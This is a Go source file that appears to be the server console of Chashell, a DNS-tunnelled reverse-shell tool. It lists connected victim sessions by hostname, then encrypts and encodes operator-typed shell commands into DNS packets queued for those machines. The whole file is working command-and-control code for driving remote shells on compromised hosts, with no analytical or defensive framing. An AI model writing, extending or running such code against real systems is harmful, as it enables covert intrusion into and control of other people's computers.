package main

import (
	"bufio"
	"chashell/lib/transport"
	"fmt"
	"github.com/c-bata/go-prompt"
	"os"
	"strings"
)

func interact(sessionID string) {
	buffer, dataAvailable := consoleBuffer[sessionID]
	if dataAvailable && buffer.Len() > 0 {
		fmt.Println(buffer.String())
	}
	delete(consoleBuffer, sessionID)

	currentSession = sessionID
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		if scanner.Text() == "background" {
			return
		}
		initPacket, dataPackets := transport.Encode([]byte(scanner.Text()+"\n"), false, encryptionKey, targetDomain, nil)
		_, valid := packetQueue[sessionID]
		if !valid {
			packetQueue[sessionID] = make([]string, 0)
		}
		packetQueue[sessionID] = append(packetQueue[sessionID], initPacket)
		for _, packet := range dataPackets {
			packetQueue[sessionID] = append(packetQueue[sessionID], packet)
		}

	}
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "reading standard input:", err)
	}
}

var commands = []prompt.Suggest{
	{Text: "sessions", Description: "Interact with the specified machine."},
	{Text: "exit", Description: "Stop the Chashell Server"},
}

func Completer(d prompt.Document) []prompt.Suggest {
	if d.TextBeforeCursor() == "" {
		return []prompt.Suggest{}
	}
	args := strings.Split(d.TextBeforeCursor(), " ")

	return argumentsCompleter(args)
}

func argumentsCompleter(args []string) []prompt.Suggest {
	if len(args) <= 1 {
		return prompt.FilterHasPrefix(commands, args[0], true)
	}

	first := args[0]
	switch first {
	case "sessions":
		second := args[1]
		if len(args) == 2 {
			sessions := []prompt.Suggest{}
			for clientGUID, clientInfo := range sessionsMap {
				sessions = append(sessions, prompt.Suggest{Text: clientGUID, Description: clientInfo.hostname})
			}

			return prompt.FilterHasPrefix(sessions, second, true)
		}

	}
	return []prompt.Suggest{}
}

func executor(in string) {
	args := strings.Split(in, " ")
	if len(args) > 0 {
		switch args[0] {
		case "exit":
			fmt.Println("Exiting.")
			os.Exit(0)
		case "sessions":
			if len(args) == 2 {
				fmt.Printf("Interacting with session %s.\n", args[1])
				interact(args[1])
			} else {
				fmt.Println("sessions [id]")
			}
		}
	}
}
